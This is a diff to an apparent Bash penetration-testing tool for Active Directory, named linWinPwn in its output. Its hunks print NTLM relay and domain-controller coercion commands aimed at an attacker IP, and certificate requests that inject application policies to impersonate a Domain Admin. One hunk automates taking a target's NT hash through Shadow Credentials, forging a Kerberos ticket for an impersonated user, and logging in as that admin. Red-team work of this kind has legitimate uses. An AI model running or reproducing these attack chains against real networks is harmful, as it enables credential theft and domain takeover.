@@ -2041,7 +2041,7 @@ adcs_vuln_parse() {
             echo -e "\n${BLUE}# \"${vulnca//SPACE/ }\" certificate authority${NC}"
             echo -e "${CYAN}1. Start the relay server (relay to the Certificate Authority and request certificate via ICPR):${NC}"
             echo -e "ntlmrelayx.py -t rpc://[ ${pki_servers} ] -rpc-mode ICPR -icpr-ca-name \"${vulnca//SPACE/ }\" -smb2support"
-            echo -e "OR"
+            echo -e "_OR_"
             echo -e "${certipy} relay -target rpc://[ ${pki_servers} ] -ca \"${vulnca//SPACE/ }\""
             echo -e "${CYAN}2. Coerce Domain Controller:${NC}"
             echo -e "${coercer} coerce ${argument_coercer} -t ${dc_ip} -l ${attacker_IP} --dc-ip $dc_ip"
@@ -2070,7 +2070,7 @@ adcs_vuln_parse() {
             echo -e "\n${BLUE}# ${vulntemp} certificate template${NC}"
             echo -e "${CYAN}1. Request a certificate injecting 'Client Authentication' Application Policy:${NC}"
             echo -e "${certipy} req ${argument_certipy} -target [ ${pki_servers} ] -ca [ \"${pki_cas//SPACE/ }\" ] -template ${vulntemp} -application-policies 'Client Authentication' -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
-            echo -e "OR"
+            echo -e "_OR_"
             echo -e "${CYAN}1. Request a certificate, injecting 'Certificate Request Agent' Application Policy, then using the 'Agent' certificate:${NC}"
             echo -e "${certipy} req ${argument_certipy} -target [ ${pki_servers} ] -ca [ \"${pki_cas//SPACE/ }\" ] -template ${vulntemp} -upn [ Domain Admin ]@${dc_domain} -sid '${sid_domain}-500' -application-policies 'Certificate Request Agent' -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
             echo -e "${certipy} req ${argument_certipy} -target [ ${pki_servers} ] -ca [ \"${pki_cas//SPACE/ }\" ] -template User -on-behalf-of $(echo "$dc_domain" | cut -d "." -f 1)\\[ Domain Admin ] -pfx '${user}.pfx' -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
@@ -3949,11 +3949,31 @@ add_upn() {
             echo -e "${CYAN}[*] Adding UPN ${value_upn} to ${target_upn}${NC}"
             run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} set object '${target_upn}' userPrincipalName -v '${value_upn}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_upn_${dc_domain}.txt"
             if grep -q -a "has been updated" "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_upn_${dc_domain}.txt"; then
-                echo -e "${GREEN}[+] Adding UPN successful! First modify getTGT.py as shown below${NC}"
-                echo -e "${YELLOW}old line #58${NC}: userName = Principal(self.__user, type=constants.PrincipalNameType.${YELLOW}NT_PRINCIPAL${NC}.value)"
-                echo -e "${YELLOW}new line #58${NC}: userName = Principal(self.__user, type=constants.PrincipalNameType.${YELLOW}NT_ENTERPRISE${NC}.value)"
-                echo -e "${GREEN}[+] Generate Kerberos ticket of impersonated user:${NC}"
-                echo -e "${impacket_getTGT} ${domain}/${value_upn}:< password of ${target_upn} > -dc-ip ${dc_ip}"
+                echo -e "${GREEN}[+] Adding UPN successful!${NC}"
+                echo -e "${BLUE}[*] Please specify NTLM hash of ${target_upn}. Press ENTER to retrieve target's NT hash using Shadow Credentials:${NC}"
+                target_upn_hash=""
+                read -rp ">> " target_upn_hash </dev/tty
+                if [ -z "$target_upn_hash" ]; then
+                    if [ "${ldaps_bool}" == true ]; then ldaps_param_ba="-s"; else ldaps_param_ba=""; fi
+                    run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param_ba} --host ${dc_FQDN} --dc-ip ${dc_ip} add shadowCredentials '${target_upn}' --path ${Credentials_dir}/shadowcreds_${user_var}_${target_upn}" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_shadowcreds_${dc_domain}.txt"
+                    target_upn_hash=$(grep ${target_upn} "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_shadowcreds_${dc_domain}.txt" -A 2| grep '^NT:' | tail -n 1 | cut -d ' ' -f 2 | tr -d ' \r\n')
+                fi
+                if [ -z "$target_upn_hash" ] || ! ([[ (${#target_upn_hash} -eq 65 && "${target_upn_hash:32:1}" == ":") || (${#target_upn_hash} -eq 33 && "${target_upn_hash:0:1}" == ":") || (${#target_upn_hash} -eq 32) ]]); then
+                    echo -e "${RED}[-] Invalid NT hash of '${target_upn}'. Aborting... ${NC}"
+                else
+                    echo -e "${BLUE}[*] Generating Kerberos ticket of impersonated user:${NC}"
+                    current_dir=$(pwd)
+                    cd "${Credentials_dir}" || exit
+                    run_command "${impacket_getTGT} -principal NT_ENTERPRISE ${domain}/${value_upn} -hashes :${target_upn_hash} -dc-ip ${dc_ip}"
+                    cd "${current_dir}" || exit
+                    if stat "${Credentials_dir}/${value_upn//\$/}.ccache" >/dev/null 2>&1; then
+                        echo -e "\n${GREEN}[+] Authenticate using ccache of impersonated Admin:${NC}"
+                        echo -e "linWinPwn -t ${dc_ip} -d ${domain} -u '${value_upn}' -K '${Credentials_dir}/${value_upn//\$/}.ccache'"
+                        echo -e "_OR_"
+                        echo -e "export KRB5CCNAME='${Credentials_dir}/${value_upn//\$/}.ccache'"
+                        echo -e "ksu ${value_upn}"
+                    fi
+                fi
             fi
         fi
     fi
@@ -3974,7 +3994,7 @@ add_upn_esc10() {
             echo -e "CertificateMappingMethods    REG_DWORD    0x4 ${GREEN}<== VULNERABLE${NC}"
             echo -e "${YELLOW}[*] If vulnerable to ESC10, press ENTER to continue....${NC}"
             read -rp "" </dev/tty
-            echo -e "${BLUE}[*] Retrieve target's NT hash using Shadow Credentials. Please specify target:${NC}"
+            echo -e "${BLUE}[*] Please specify target:${NC}"
             echo -e "${CYAN}[*] Example: user01 ${NC}"
             target_upn=""
             read -rp ">> " target_upn </dev/tty
@@ -3991,7 +4011,7 @@ add_upn_esc10() {
                 target_upn_hash=$(grep ${target_upn} "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_shadowcreds_${dc_domain}.txt" -A 2| grep '^NT:' | tail -n 1 | cut -d ' ' -f 2 | tr -d ' \r\n')
             fi
             if [ -z "$target_upn_hash" ] || ! ([[ (${#target_upn_hash} -eq 65 && "${target_upn_hash:32:1}" == ":") || (${#target_upn_hash} -eq 33 && "${target_upn_hash:0:1}" == ":") || (${#target_upn_hash} -eq 32) ]]); then 
-                echo -e "${RED}[-] Invalid NT hash of ${target_upn}. Aborting... ${NC}"
+                echo -e "${RED}[-] Invalid NT hash of '${target_upn}'. Aborting... ${NC}"
             else
                 ne_adcs_enum
                 value_upn=""
@@ -6266,8 +6286,8 @@ modif_menu() {
     echo -e "17) Abuse GPO to execute command (Requires: ${PURPLE}GenericWrite${NC} on GPO)"
     echo -e "18) Add Unconstrained Delegation rights - uac: TRUSTED_FOR_DELEGATION (Requires: ${PURPLE}SeEnableDelegationPrivilege${NC} rights)"
     echo -e "19) Add CIFS and HTTP SPNs entries to computer with Unconstrained Deleg rights - ServicePrincipalName & msDS-AdditionalDnsHostName (Requires: ${PURPLE}Owner${NC} of computer)"
-    echo -e "20) Add userPrincipalName to perform Kerberos impersonation of another user (Requires: ${PURPLE}GenericWrite${NC} on user)"
-    echo -e "21) Modify userPrincipalName to perform Certificate impersonation (UPN Spoofing - ESC10) (Requires: ${PURPLE}GenericWrite${NC} on user)"
+    echo -e "20) Add userPrincipalName to perform Kerberos impersonation of another user (Targeting Linux machines) (Requires: ${PURPLE}GenericWrite${NC} on user)"
+    echo -e "21) Modify userPrincipalName to perform Certificate impersonation (ESC10) (Requires: ${PURPLE}GenericWrite${NC} on user)"
     echo -e "22) Add Constrained Delegation rights - uac: TRUSTED_TO_AUTH_FOR_DELEGATION (Requires: ${PURPLE}SeEnableDelegationPrivilege${NC} rights)"
     echo -e "23) Add HOST and LDAP SPN entries of DC to computer with Constrained Deleg rights - msDS-AllowedToDelegateTo (Requires: ${PURPLE}Owner${NC} of computer)"
     echo -e "back) Go back"
